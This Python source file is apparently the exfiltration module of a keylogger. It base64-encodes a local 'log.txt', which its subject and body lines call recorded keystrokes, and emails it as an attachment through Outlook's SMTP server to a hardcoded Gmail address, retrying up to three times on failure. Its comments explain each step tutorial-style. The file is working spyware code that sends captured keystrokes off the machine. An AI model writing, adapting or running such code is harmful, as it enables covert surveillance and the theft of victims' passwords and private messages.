import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from decouple import config
from retry import retry

#Instances are created  to create an object structure to have the appropriate mail headers.

@retry((Exception), tries=3, delay=2,backoff=2)        #backoff makes each run delay to be 2,4,8 after each attempt

def send_mail():

    if __name__ == "sendoutlook":

        fromaddr = "ochibugo@outlook.com"

        toaddr = "hogujiuba@gmail.com"

        password = config("PASS")

        msg = MIMEMultipart()            #creating instance of multipart(protocol for transfer of text or non text attachments) bcos there is going to be an attachment not just text | also bcos msg will consist of diff parts

        msg["From"] = fromaddr          #storing the senders address

        msg["To"] = toaddr

        msg["Subject"] = "Keylog Strokes Compilation file"

        body = "This file contains the recorded keystrokes."

        msg.attach(MIMEText(body,"plain"))     #attaching the body to msg instance bcos we can(with multipart)

        filename = "log.txt"
        attachment = open("log.txt","rb")

        p = MIMEBase("application","octet-stream")    #creating instance of MimeBase | simply a base class | app,octet is used for unknown binary files(to preserve file contents) which should be specified by coder through extension attached

        p.set_payload((attachment).read())    #to change the payload into encoded form

        encoders.encode_base64(p)       #encode into base 64 to be able to be sent

        p.add_header("Content-Disposition","attachment;filename=%s"%filename)   # indicates content to be displayed as an attachment

        msg.attach(p)      #attach instance 'p' to instance 'msg'

        s = smtplib.SMTP("smtp.office365.com",587)   #creates SMTP session

        s.starttls()     #start tls for security

        s.login(fromaddr,password)     #Authentication

        text = msg.as_string()         #converts the multipart message into a string

        s.sendmail(fromaddr,toaddr,text)

        s.quit



